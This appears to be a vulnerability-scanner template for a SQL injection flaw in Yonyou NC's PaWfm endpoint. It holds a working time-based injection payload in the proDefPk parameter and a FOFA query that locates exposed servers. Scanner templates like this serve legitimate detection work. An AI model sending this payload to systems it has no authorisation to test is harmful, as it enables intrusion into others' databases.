id: yonyou-nc-pawfm-sqli

info:
  name: Yonyou NC PaWfm - SQL Injection
  author: Co5mos
  severity: high
  description: Detects SQL Injection vulnerability in Yonyou NC PaWfm.
  reference:
    https://github.com/wy876/POC/commit/f99120f4cc57f371920abb81d23bd1db27d42f3b
  metadata:
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        @timeout: 15s
        GET /portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}

    max-redirects: 3
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
          - 'status_code == 200'
          - 'contains(body, "@NOPRODEF@")'
        condition: and